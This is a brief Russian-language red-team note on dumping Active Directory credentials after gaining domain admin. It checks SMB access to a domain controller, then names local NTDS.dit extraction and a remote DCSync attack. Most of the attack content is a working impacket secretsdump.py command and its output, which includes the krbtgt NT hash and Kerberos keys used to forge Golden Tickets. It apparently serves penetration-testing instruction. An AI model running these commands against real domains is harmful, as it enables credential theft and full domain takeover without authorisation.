# About

Как вообще понять, что мы имеем необходимые права на домене? Если видим такую картину, то у нас права на подключение текущим пользователем по SMB к DC:

```
PS C:\> ls \\target-dc\c$


    Directory: \\target-dc\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/29/2020   9:34 PM                PerfLogs
d-r---       10/29/2020   9:31 AM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---        11/1/2020   8:03 AM                Users
d-----         4/3/2022   3:37 AM                Windows
```

Когда получили администратора домена, мы захотим сдампить содержимое базы DC для получения информации (например, krbtgt секреты для создания Golden Tickets).

Сделать мы это можем двумя путями:

* Локально: [сдампив **NTDS.dit**](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-ntdsutil) с помощью [ntdsutil](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343\(v=ws.11\)) или [vssadmin](https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/vssadmin)
* Удаленно: **DCSync-атака** с помощью **mimikatz** `lsadump::dsync` или **impacket** `secretsdump.py`.

**Нюанс**: если на большом AD запросить все кредсы через DCSync — сервер упадет, так что лучше запрашивать необходимых пользователей:

```
$ secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8b03404a4975e7226caf6162cfccba:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
krbtgt:aes128-cts-hmac-sha1-96:a268f61e103134bb7e975a146ed1f506
krbtgt:des-cbc-md5:0e6d79d66b4951cd
[*] Cleaning up...
```
